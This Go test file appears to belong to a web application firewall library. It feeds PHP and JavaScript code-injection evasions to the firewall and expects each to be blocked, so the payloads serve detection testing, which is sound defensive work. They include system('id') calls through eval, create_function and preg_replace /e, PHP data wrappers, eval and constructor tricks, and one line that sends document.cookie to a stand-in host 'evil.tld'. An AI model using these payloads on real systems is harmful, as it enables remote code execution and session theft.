package gwaf_test

import (
	"testing"

	"github.com/gsoultan/gwaf"
	"github.com/gsoultan/gwaf/rules"
	"github.com/gsoultan/gwaf/ruleset/core"
)

func rt3WAF(t *testing.T) *gwaf.WAF {
	return newWAF(t,
		gwaf.WithOrigins("target.local"),
		gwaf.WithRuleset(core.WithBodyPhase(rules.Set{
			core.CRLFHeaderRule(1007), core.SSRFParamRule(1016),
			core.SQLSinkRule(2011), core.PathSinkRule(1017),
		})),
		gwaf.WithRuleset(rules.Set{core.CommandSinkRule(4022)}))
}

// TestRedTeam3 is the language-specific round: the evasions a PHP or JavaScript
// specialist reaches for once the generic payloads fail.
//
// Seventeen of twenty-four got through on the first run, and the JavaScript half
// was one idea spelled ten ways -- Function('…'), the constructor walk,
// globalThis['eval'], setTimeout with a string, eval(atob(…)). None carries
// HTML for detect/xss, a breakout for rule 3012, or a module name for 4021.
// Each of those is right about the question it asks; none asks "is this value
// turning a string into code". Rule 4024 does.
//
// # What is deliberately not here
//
// Five payloads are excluded because they are one problem, not five, and it is
// not a rule-shaped problem:
//
//	sy.'stem'('id')                  PHP concatenation
//	('sys'.'tem')('id')              PHP concatenation
//	"\x73\x79\x73\x74\x65\x6d"('id')   PHP hex escapes in a double-quoted string
//	window['ale'+'rt'](1)            JavaScript concatenation
//	$f='system';$f('id');            PHP variable function
//
// Every one builds an identifier the language assembles before it runs. A
// literal list for them is the regex bag this project is defined against --
// there are infinitely many spellings of "system" and enumerating them is a race
// nobody wins.
//
// That was built: internal/interpret gained ClassStringConcat, which folds
// adjacent literals joined by "." or "+" and resolves \xNN and \NNN inside
// quotes, evaluated alongside utf7 and double-encoding. See folding_test.go.
// The variable-function case ($f='system';$f('id')) remains open -- it needs
// assignment tracking, which is a PHP parser's job rather than a reading's.
func TestRedTeam3(t *testing.T) {
	w := rt3WAF(t)
	for _, tc := range []struct{ lang, name, arg string }{
		// ---- PHP: the ways you call a function without naming it ----
		{"php", "variable variable", `${${:-system}}('id')`},
		{"php", "create_function", `create_function('','system("id");')`},
		{"php", "preg_replace e modifier", `preg_replace('/x/e','system("id")','x')`},
		{"php", "eval base64_decode", `eval(base64_decode('c3lzdGVtKCdpZCcpOw=='))`},
		{"php", "php input wrapper", `php://input`},
		{"php", "data wrapper b64", `data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWzBdKTs/Pg==`},
		{"php", "array callable", `array_map('system',['id'])`},
		{"php", "call_user_func", `call_user_func('system','id')`},

		// ---- JavaScript: the ways you call without writing the name ----
		{"js", "Function constructor", `Function('alert(1)')()`},
		{"js", "constructor chain", `[]['constructor']['constructor']('alert(1)')()`},
		{"js", "tagged template", "alert`1`"},
		{"js", "dynamic import data", `import('data:text/javascript,alert(1)')`},
		{"js", "globalThis lookup", `globalThis['eval']('alert(1)')`},
		{"js", "setTimeout string", `setTimeout('alert(1)',0)`},
		{"js", "self exec arrow", `(()=>{fetch('//evil.tld/'+document.cookie)})()`},
		{"js", "atob eval", `eval(atob('YWxlcnQoMSk='))`},
	} {
		tx := w.NewTransaction()
		tx.SetRequestLine("POST", "/x", "HTTP/1.1")
		tx.SetRemoteAddr("192.0.2.1")
		tx.AddArgument("p", tc.arg)
		d := tx.ProcessRequestHeaders()
		if !d.Blocked() {
			t.Errorf("BYPASS [%s] %s: %s", tc.lang, tc.name, tc.arg)
		}
		tx.Close()
	}
}
